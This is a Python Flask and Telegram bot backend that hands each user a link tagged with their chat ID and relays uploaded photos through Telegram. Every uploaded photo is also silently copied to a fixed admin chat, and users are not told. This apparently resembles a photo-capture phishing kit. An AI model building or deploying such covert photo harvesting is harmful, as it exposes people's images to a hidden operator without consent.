from flask import Flask, render_template, request
import telebot
import os
from dotenv import load_dotenv

# ==========================
# Load .env variables
# ==========================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = os.getenv("CHAT_ID")  # your Telegram chat ID
PROJECT_LINK = os.getenv("PROJECT_LINK")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==========================
# Flask routes
# ==========================
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    """Handle photo uploads from index.html"""
    if "photo" not in request.files:
        return "No photo", 400

    photo = request.files["photo"]
    chat_id = request.form.get("chat_id", ADMIN_CHAT_ID)  # fallback to admin

    temp_path = f"temp_{chat_id}.jpg"
    photo.save(temp_path)

    try:
        with open(temp_path, "rb") as img:
            # Send to the user
            bot.send_photo(chat_id, img)

            # Send a copy to admin
            img.seek(0)
            bot.send_photo(ADMIN_CHAT_ID, img)
    except Exception as e:
        print("❌ Telegram send error:", e)
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

    return "OK"

# ==========================
# Telegram webhook route
# ==========================
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    """Handle incoming Telegram updates"""
    json_str = request.get_data().decode("UTF-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "!", 200

# ==========================
# Bot handlers
# ==========================
@bot.message_handler(commands=["start"])
def start(message):
    """When user sends /start"""
    username = message.from_user.first_name
    chat_id = message.chat.id
    text = (
        f"👋 Hello {username}!\n\n"
        f"This is your private link:\n"
        f"{PROJECT_LINK}?chat_id={chat_id}\n\n"
        f"📌 Your chat ID: `{chat_id}`"
    )
    bot.send_message(chat_id, text, parse_mode="Markdown")

# ==========================
# Entrypoint
# ==========================
if __name__ == "__main__":
    import requests

    # Register webhook
    webhook_url = f"{PROJECT_LINK}/{BOT_TOKEN}"
    set_webhook = requests.get(
        f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    ).json()
    print("Webhook setup:", set_webhook)

    # Start Flask server
    app.run(host="0.0.0.0", port=10000)
